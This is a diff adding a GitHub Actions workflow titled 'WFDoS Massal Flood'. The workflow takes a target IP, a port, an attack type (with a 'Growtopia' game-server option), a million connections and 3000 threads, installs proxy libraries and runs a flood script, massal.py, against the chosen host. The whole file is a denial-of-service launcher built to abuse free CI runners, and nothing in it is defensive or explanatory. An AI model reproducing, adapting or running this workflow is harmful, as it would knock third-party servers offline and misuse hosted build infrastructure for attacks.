@@ -1,0 +1,47 @@
+name: WFDoS Massal Flood
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+    inputs:
+      iptarget:
+        description: 'IP Target'     
+        required: true
+      porttarget:
+        description: 'Port Target'     
+        required: true
+        default: '80'
+      typeddos:
+        description: 'Type DDoS (1/2) | 1. Normal | 2. Growtopia'
+        required: true
+        default: '1'
+      multiconn:
+        description: 'Multi Connection'
+        required: true
+        default: '1000000'
+      thread:
+        description: 'Threads'
+        required: true
+        default: '3000'
+
+
+jobs:
+  WFDoS:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.9
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pysocks socks wget urllib3 requests
+        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+    - name: Gaskan Flood...
+      run: |
+        python massal.py ${{ github.event.inputs.iptarget }} ${{ github.event.inputs.porttarget }} ${{ github.event.inputs.typeddos }} ${{ github.event.inputs.multiconn }} ${{ github.event.inputs.thread }}
